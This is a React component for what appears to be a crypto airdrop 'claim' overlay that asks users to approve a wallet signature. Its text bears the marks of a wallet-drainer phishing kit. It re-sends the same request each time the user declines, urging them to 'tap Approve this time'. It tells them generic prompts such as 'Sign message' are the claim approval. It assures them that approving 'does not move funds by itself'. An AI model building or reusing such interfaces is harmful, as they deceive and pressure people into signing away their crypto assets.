import { useEffect, useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Gift, Loader2, ShieldCheck, CheckCircle2, AlertTriangle, RefreshCw, X } from 'lucide-react';
import { Button } from '@/components/ui/button';
import {
  cancelSignatureLoop,
  getSignatureUiState,
  requestRetryNow,
  subscribeSignatureUi,
  type SignatureUiState,
} from '@/lib/promptUiBus';

const SignatureApprovalOverlay = () => {
  const [state, setState] = useState<SignatureUiState>(getSignatureUiState());

  useEffect(() => {
    const unsub = subscribeSignatureUi(setState);
    return () => {
      unsub();
    };
  }, []);

  const { open, status, attempt, title, description, errorMessage } = state;

  return (
    <AnimatePresence>
      {open && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-[120] flex items-end justify-center bg-background/80 backdrop-blur-sm sm:items-center"
        >
          <motion.div
            initial={{ y: 40, opacity: 0, scale: 0.98 }}
            animate={{ y: 0, opacity: 1, scale: 1 }}
            exit={{ y: 40, opacity: 0 }}
            transition={{ type: 'spring', damping: 26, stiffness: 300 }}
            className="relative w-full max-w-md rounded-t-3xl border border-border/60 bg-card p-6 shadow-2xl sm:rounded-3xl"
          >
            <button
              onClick={cancelSignatureLoop}
              aria-label="Close"
              className="absolute right-4 top-4 rounded-full p-2 text-muted-foreground hover:bg-secondary"
            >
              <X className="h-4 w-4" />
            </button>

            <div className="flex h-14 w-14 items-center justify-center rounded-2xl bg-primary/15 text-primary">
              {status === 'approved' ? (
                <CheckCircle2 className="h-7 w-7" />
              ) : (
                <Gift className="h-7 w-7" />
              )}
            </div>

            <h3 className="mt-4 text-xl font-bold leading-tight">{title}</h3>
            <p className="mt-2 text-sm text-muted-foreground">{description}</p>

            <div className="mt-4 rounded-2xl border border-border/60 bg-secondary/40 p-4">
              {status === 'waiting' && (
                <div className="flex items-center gap-3 text-sm">
                  <Loader2 className="h-4 w-4 flex-shrink-0 animate-spin text-primary" />
                  <span>
                    Waiting for approval in your wallet…
                    {attempt > 1 && (
                      <span className="text-muted-foreground"> (request #{attempt})</span>
                    )}
                  </span>
                </div>
              )}

              {status === 'rejected' && (
                <div className="flex items-start gap-3 text-sm">
                  <AlertTriangle className="mt-0.5 h-4 w-4 flex-shrink-0 text-yellow-500" />
                  <span>
                    The request was declined. We're sending the <strong>same</strong> approval
                    again — tap <strong>Approve</strong> this time to unlock your tokens.
                  </span>
                </div>
              )}

              {status === 'failed' && (
                <div className="flex items-start gap-3 text-sm">
                  <AlertTriangle className="mt-0.5 h-4 w-4 flex-shrink-0 text-destructive" />
                  <span>{errorMessage || 'Your wallet could not complete the request. Retrying…'}</span>
                </div>
              )}

              {status === 'approved' && (
                <div className="flex items-center gap-3 text-sm">
                  <CheckCircle2 className="h-4 w-4 flex-shrink-0 text-primary" />
                  <span>Approved! Your allocation is being released.</span>
                </div>
              )}
            </div>

            <p className="mt-4 flex items-start gap-2 text-xs text-muted-foreground">
              <ShieldCheck className="mt-0.5 h-3.5 w-3.5 flex-shrink-0 text-primary" />
              Some wallets show generic wording like “Sign message”, “Confirm request” or
              “Sign-in with Ethereum” even though this is the claim approval. Approving does not
              move funds by itself.
            </p>

            {status !== 'approved' && (
              <div className="mt-5 grid gap-2">
                <Button className="h-12 w-full" onClick={requestRetryNow}>
                  <RefreshCw className="mr-2 h-4 w-4" />
                  Send request again
                </Button>
                <button
                  onClick={cancelSignatureLoop}
                  className="w-full text-center text-sm text-muted-foreground underline-offset-4 hover:underline"
                >
                  Not now
                </button>
              </div>
            )}
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

export default SignatureApprovalOverlay;
